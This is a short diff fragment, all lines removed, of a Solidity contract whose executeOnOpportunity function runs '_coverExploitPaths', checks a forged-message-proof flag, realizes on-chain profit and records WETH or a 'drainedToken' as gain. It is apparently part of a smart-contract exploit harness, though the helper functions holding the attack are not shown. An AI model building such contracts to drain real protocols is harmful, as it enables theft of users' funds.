-    constructor() {}
-
-    receive() external payable {}
-
-    function executeOnOpportunity() external {
-        if (executed) {
-            return;
-        }
-        executed = true;
-
-        uint256 wethBefore = _balanceOf(WETH, address(this));
-
-        _coverExploitPaths();
-
-        if (path3_forgedMessageProveAndProcess) {
-            _realizeOnChainProfit();
-        }
-
-        uint256 wethAfter = _balanceOf(WETH, address(this));
-        if (wethAfter > wethBefore) {
-            _profitToken = WETH;
-            _profitAmount = wethAfter - wethBefore;
-        } else if (_profitToken == address(0) && drainedToken != address(0) && drainedAmount != 0) {
-            _profitToken = drainedToken;
-            _profitAmount = drainedAmount;
-        }
